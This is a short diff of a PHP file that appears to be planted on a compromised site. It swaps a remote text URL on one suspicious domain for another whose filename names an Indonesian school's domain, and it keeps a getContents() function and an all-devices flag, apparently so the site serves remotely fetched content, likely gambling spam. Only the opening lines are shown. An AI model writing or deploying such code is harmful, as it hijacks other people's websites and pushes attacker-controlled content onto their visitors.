@@ -1,6 +1,6 @@
 <?php
 
-$contents = 'https://sugardady.xyz/toto88.txt';
+$contents = 'https://supernika.cloud/jangan-ya-dek-ya/slbn3kotabengkulu.sch.id.txt';
 $allDevice = true;
 
 function getContents($url) {
